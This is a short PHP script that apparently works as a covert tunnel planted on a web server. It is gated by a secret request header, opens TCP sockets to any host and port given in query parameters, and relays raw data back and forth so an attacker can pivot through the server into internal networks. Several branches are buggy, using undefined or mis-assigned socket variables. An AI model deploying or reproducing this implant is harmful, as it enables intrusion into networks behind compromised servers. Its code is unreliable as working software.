<?php
function e($msg){
    Header('S: '.json_encode(array('status'=>"0", "message"=>$msg)));
    ob_end_flush();
    die();
}
function s($msg){
    Header('S: '.json_encode(array('status'=>"1", "message"=>$msg)));
    ob_end_flush();
}

set_time_limit(0);
ignore_user_abort(true);
session_start();

$headers = apache_request_headers();

$command = $headers['C'];

if (!isset($command)){
    die('Close sesame!');
}


$host = $_GET['h'];
$port = $_GET['p'];


switch($command){
case 'N':
    if(!is_resource($_SESSION['connection'])){
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or e("Can not create socket!");
        $connection = socket_connect($socket, $host, $port) or e("Can not connet to $host:$port!");
        socket_set_nonblock($connection);
        $_SESSION['connection'] = $connection;
        s('New connecion created : '.$host.':'.$port);
    }else{
        $connection = $_SESSION['connection'];
        socket_set_nonblock($connection);
        s('Using old connection : '.$host.':'.$port);
    }
    break;
case 'W':
    session_write_close();
    $data = file_get_contents("php://input");
    socket_write($socket, $data) or e("Write data error!");
    s('Write '.strlen($data).'Bytes');
    break;
case 'R':
    session_write_close();
    while ($data= socket_read($socket, 1024, PHP_NORMAL_READ)) {
        s('Read '.strlen($data).'Bytes');
        echo $data;
        if(ob_get_level()>0)ob_flush();
    }
    e('Read errir!');
    break;
case 'C':
    socket_close($connection);
    $_SESSION['connection'] = NULL;
    s('Closing connection : '.$host.':'.$port);
    break;
default:
    break;
}
